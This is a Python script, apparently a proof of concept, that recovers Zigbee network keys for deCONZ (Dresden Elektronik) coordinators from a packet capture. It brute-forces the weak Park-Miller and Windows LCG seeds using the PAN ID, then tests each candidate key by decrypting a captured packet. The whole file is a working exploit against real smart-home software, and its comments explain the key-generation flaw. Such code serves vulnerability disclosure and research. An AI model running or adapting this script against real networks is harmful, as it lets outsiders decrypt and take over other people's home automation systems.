#!/usr/bin/env python3
import sys

if sys.version_info < (3, 8):
    raise RuntimeError(f"Python 3.8 or newer is required, you have {sys.version_info}")

import typing
import itertools

import tqdm

print("Loading scapy", file=sys.stderr)
import scapy.all
import scapy.config
import scapy.packet
import scapy.layers.zigbee
import scapy.layers.dot15d4

import killerbee.scapy_extensions


scapy.config.conf.dot15d4_protocol = "zigbee"

DRESDEN_ELEKTRONIK_PREFIX = 0x00212E0000000000
DRESDEN_ELEKTRONIK_MASK = 0xFFFFFF0000000000


def format_key(key: bytes) -> str:
    return ":".join(f"{b:02X}" for b in key)


class BaseLCG:
    multiplier = None
    increment = None
    modulus = None

    def __init__(self, seed: int):
        self.state = seed & 0xFFFFFFFF

    def transform(self, state: int) -> int:
        return self.state

    def __next__(self) -> int:
        self.state = (self.state * self.multiplier + self.increment) % self.modulus
        return self.transform(self.state)

    def __iter__(self):
        return self


class ParkMillerLCG(BaseLCG):
    multiplier = 48271
    increment = 0
    modulus = 0x7FFFFFFF  # prime


class WindowsLCG(BaseLCG):
    multiplier = 214013  # relatively prime to modulus
    increment = 2531011
    modulus = 0x80000000  # prime power

    def transform(self, state: int) -> int:
        return (state >> 16) & 0x7FFF


def compute_key(rng: BaseLCG) -> bytes:
    """
    Computes the network key with the provided LCG using the algorithm used by the
    deCONZ REST plugin.

    Note that even with a strong random number generator (which does not leak its
    internal state), the conversion to hex ASCII effectively reduces the key size to 64
    bits, from the expected 128 bits.
    """

    # The first output is used to generate the PAN ID
    next(rng)

    # Leading zeroes are skipped: [0x01, 0x20, 0x03] becomes the ASCII string "1203"
    parts = [f"{next(rng):x}".encode("ascii") for _ in range(4)]

    # If the first two outputs are large enough (i.e. both > 0x10000000), converting
    # them both to ASCII will use all 16 bytes. Thus, there is an 88% chance that the
    # last two values returned by the RNG will never affect the key.
    return b"".join(parts).ljust(16, b"\x00")[:16]


def iter_key_candidates_linux(pan_id: int) -> typing.Iterator[bytes]:
    """
    Brute-force the internal LCG state given the PAN ID and yield all possible keys.
    The search space is 16 bits.
    """

    mult_inv = pow(ParkMillerLCG.multiplier, -1, ParkMillerLCG.modulus)

    # Brute force the upper half of the 32-bit LCG state
    for upper in tqdm.tqdm(range(0x0000, 0xFFFF + 1), unit=" keys", unit_scale=True):
        state = (upper << 16) | pan_id
        seed_candidate = (state * mult_inv) % ParkMillerLCG.modulus

        yield compute_key(ParkMillerLCG(seed_candidate))


def iter_key_candidates_windows(pan_id: int) -> typing.Iterator[bytes]:
    """
    Brute-force the internal LCG state given the PAN ID and yield all possible keys.
    The Windows search space is 17 bits.
    """

    mult_inv = pow(WindowsLCG.multiplier, -1, WindowsLCG.modulus)

    for high, lower in tqdm.tqdm(
        # Brute force both the high bit and the lower 16 bits
        iterable=itertools.product((0x8000, 0x0000), range(0x0000, 0xFFFF + 1)),
        unit=" keys",
        unit_scale=True,
        total=2 ** (1 + 16),
    ):
        state = ((pan_id | high) << 16) | lower
        state = (state - WindowsLCG.increment) % WindowsLCG.modulus
        seed_candidate = (state * mult_inv) % WindowsLCG.modulus

        yield compute_key(WindowsLCG(seed_candidate))


def validate_key(packet, key: bytes) -> bool:
    """
    Returns whether or not the key can decrypt the provided packet.
    """

    # TODO: This is unnecessarily slow
    result = killerbee.scapy_extensions.kbdecrypt(packet, key=key)
    return type(result) is not scapy.packet.Raw


if __name__ == "__main__":
    seen_networks = set()

    print("Reading packets from", sys.argv[1], file=sys.stderr)

    with scapy.all.PcapReader(sys.argv[1]) as reader:
        for packet in reader:
            # We can only work with encrypted packets
            try:
                sec_hdr = packet[scapy.layers.zigbee.ZigbeeSecurityHeader]
            except IndexError:
                continue

            pan_id = packet[scapy.layers.dot15d4.Dot15d4Data].dest_panid
            nwk = packet[scapy.layers.zigbee.ZigbeeNWK]

            # Need the extended source to check for a deCONZ IEEE
            if "extended_src" not in nwk.flags:
                continue

            if nwk.ext_src & DRESDEN_ELEKTRONIK_MASK != DRESDEN_ELEKTRONIK_PREFIX:
                continue

            if pan_id in seen_networks:
                continue

            print(f"Found deCONZ network 0x{pan_id:04X}", file=sys.stderr)
            seen_networks.add(pan_id)

            for key in itertools.chain(
                iter_key_candidates_linux(pan_id),
                iter_key_candidates_windows(pan_id),
            ):
                if validate_key(packet, key):
                    break
            else:
                print(f"Network key for 0x{pan_id:04X}: not found")
                continue

            print(f"Network key for 0x{pan_id:04X}: {format_key(key)}")
